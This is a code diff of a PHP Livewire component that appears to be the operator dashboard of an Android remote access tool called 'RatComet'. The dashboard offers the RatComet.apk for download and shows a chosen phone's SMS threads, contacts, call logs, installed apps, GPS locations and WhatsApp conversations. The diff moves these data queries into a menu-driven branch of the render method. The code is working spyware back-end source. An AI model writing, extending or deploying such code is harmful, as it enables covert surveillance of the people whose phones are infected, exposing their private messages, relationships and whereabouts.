@@ -41,11 +41,6 @@ class Home extends Component
     public function showWhatsapp() {
         $this->resetChoice();
         $this->menu = '7';
-        $this->whatsappList = SocialApp::latest('date')->orderBy('position','DESC')->where(['imei'=>$this->phoneImei,'platform'=>'whatsapp'])->get()->unique('contact');
-        if($this->whatsappList->count() != 0){
-            $this->selectedWhatsappConversation = $this->whatsappList->toArray()[0]["contact"];
-            $this->whatsappConversationList = SocialApp::orderBy('position','ASC')->where(['imei'=>$this->phoneImei,'platform'=>'whatsapp','contact'=> $this->selectedWhatsappConversation])->get();
-        }
     }
     public function download() {
         return Storage::download('public/mobile/RatComet.apk', "RatComet.apk",['Content-Type'=>'application/vnd.android.package-archive','Content-Disposition'=>'attachment;filename="RatComet.apk"',]);
@@ -57,11 +52,6 @@ class Home extends Component
     public function showSms() {
         $this->resetChoice();
         $this->menu = '1';
-        $this->smsList = Sms::latest('date')->where('imei',$this->phoneImei)->get()->unique('contact');
-        if($this->smsList->count() != 0) {
-            $this->selectedSmsConversation = $this->smsList->toArray()[0]["contact"];
-            $this->smsConversationList = Sms::where(['imei'=>$this->phoneImei,'contact'=>$this->selectedSmsConversation])->get();
-        }
     }
     public function showSmsConversation($contact) {
         $this->selectedSmsConversation = $contact;
@@ -73,12 +63,10 @@ class Home extends Component
     public function showContacts() {
         $this->resetChoice();
         $this->menu = '2';
-        $this->contactList = Contact::where('imei',$this->phoneImei)->get();
     }
     public function showCallLogs() {
         $this->resetChoice();
         $this->menu = '3';
-        $this->callLogList = ContactLog::where('imei',$this->phoneImei)->orderBy("date","DESC")->get();
     }
     public function showDashboard() {
         // get all regquired adat from db
@@ -88,12 +76,10 @@ class Home extends Component
     public function showApps() {
         $this->resetChoice();
         $this->menu = '4';
-        $this->appsList = App::where('imei',$this->phoneImei)->get();
     }
     public function showLocation() {
         $this->resetChoice();
         $this->menu = '6';
-        $this->locationList = Location::where('imei',$this->phoneImei)->pluck('latitude','longitude')->toArray();
         // dd($this->locationList);
     }
     public function showPhone() {
@@ -146,6 +132,35 @@ class Home extends Component
             array_push($tmphones,$token->phone);
         }
         $this->phoneList = $tmphones;
+
+        if($this->menu == '1'){
+            $this->smsList = Sms::latest('date')->where('imei',$this->phoneImei)->get()->unique('contact');
+            if($this->smsList->count() != 0) {
+                $this->selectedSmsConversation = $this->smsList->toArray()[0]["contact"];
+                $this->smsConversationList = Sms::where(['imei'=>$this->phoneImei,'contact'=>$this->selectedSmsConversation])->get();
+            }
+        }else if($this->menu == '2'){
+            $this->contactList = Contact::where('imei',$this->phoneImei)->get();
+
+        }else if($this->menu == '3') {
+            $this->callLogList = ContactLog::where('imei',$this->phoneImei)->orderBy("date","DESC")->get();
+
+        }else if($this->menu == '4') {
+            $this->appsList = App::where('imei',$this->phoneImei)->get();
+
+        }else if($this->menu == '6') {
+            $this->locationList = Location::where('imei',$this->phoneImei)->pluck('latitude','longitude')->toArray();
+
+        }else if($this->menu == '7') {
+            $this->whatsappList = SocialApp::orderBy('position','DESC')->where(['imei'=>$this->phoneImei,'platform'=>'whatsapp'])->get()->unique('contact')->sortByDesc('currentDate');
+            if($this->whatsappList->count() != 0){
+                $this->selectedWhatsappConversation = $this->whatsappList->toArray()[0]["contact"];
+                $this->whatsappConversationList = SocialApp::orderBy('position','ASC')->where(['imei'=>$this->phoneImei,'platform'=>'whatsapp','contact'=> $this->selectedWhatsappConversation])->get();
+            }
+        }else{
+
+        }
+
     
         return view('livewire.client.home',[
             "locationList" => $this->locationList,
